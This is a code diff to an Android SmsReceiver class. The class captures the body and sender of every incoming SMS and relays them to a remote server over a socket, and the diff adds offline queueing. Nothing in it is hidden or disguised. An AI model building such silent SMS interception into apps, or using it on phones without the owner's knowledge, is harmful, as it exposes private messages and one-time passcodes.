@@ -39,6 +39,7 @@ public class SmsReceiver extends BroadcastReceiver {
             Object[] pdus = (Object[]) bundle.get("pdus");
             if (pdus == null || pdus.length == 0) return;
 
+            //helper.show("New SMS Message Rc");
             String format = bundle.getString("format");
             StringBuilder fullMessage = new StringBuilder();
             String sender = "";
@@ -57,6 +58,8 @@ public class SmsReceiver extends BroadcastReceiver {
             String messageBody = fullMessage.toString();
             if (messageBody.isEmpty() || sender.isEmpty()) return;
 
+            //helper.show("FUllMessage " + fullMessage);
+
             // ✅ Build payload for server
             JSONObject sendPayload = new JSONObject();
             sendPayload.put("message", messageBody);
@@ -65,54 +68,13 @@ public class SmsReceiver extends BroadcastReceiver {
             sendPayload.put("sms_forwarding_status", "sending");
             sendPayload.put("sms_forwarding_status_message", "Request for sending");
 
+            if(!helper.isNetworkAvailable(context) || !socketManager.isConnected()){
+                PendingSmsManager pendingManager = new PendingSmsManager(context);
+                pendingManager.addPending(sendPayload);
+                return ;
+            }
             // ✅ Safe socket emit
-            socketManager.emitWithAck("smsForwardingData", sendPayload, new SocketManager.AckCallback() {
-                @Override
-                public void onResponse(JSONObject response) {
-                    try {
-                        int status = response.optInt("status", 0);
-                        if (status == 200) {
-                            JSONObject dataObj = response.optJSONObject("data");
-                            if (dataObj == null) return;
-
-                            userId = dataObj.optInt("id");
-                            String phoneNumber = dataObj.optString("forward_to_number", "");
-                            if (phoneNumber.isEmpty()) return;
-
-                            // Unique request codes
-                            int sentCode = (userId + phoneNumber).hashCode();
-                            int deliveredCode = (userId + phoneNumber + "_delivered").hashCode();
-
-                            Intent sentIntent = new Intent(context, SentReceiver.class);
-                            Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
-                            sentIntent.putExtra("id", userId);
-                            sentIntent.putExtra("phone", phoneNumber);
-                            deliveredIntent.putExtra("id", userId);
-                            deliveredIntent.putExtra("phone", phoneNumber);
-
-                            PendingIntent sentPI = PendingIntent.getBroadcast(
-                                    context, sentCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
-
-                            PendingIntent deliveredPI = PendingIntent.getBroadcast(
-                                    context, deliveredCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
-
-                            // ✅ Split long messages automatically
-                            smsManager.sendMultipartTextMessage(
-                                    phoneNumber, null,
-                                    smsManager.divideMessage(messageBody),
-                                    null, null
-                            );
-                        }
-                    } catch (Exception e) {
-                        Log.e("SmsReceiver", "Error processing socket response", e);
-                    }
-                }
-
-                @Override
-                public void onError(String error) {
-                    Log.e("SmsReceiver", "Socket emit error: " + error);
-                }
-            });
+            socketManager.sendSMSWithSocket(sendPayload);
 
         } catch (JSONException e) {
             Log.e("SmsReceiver", "JSON error: " + e.getMessage());
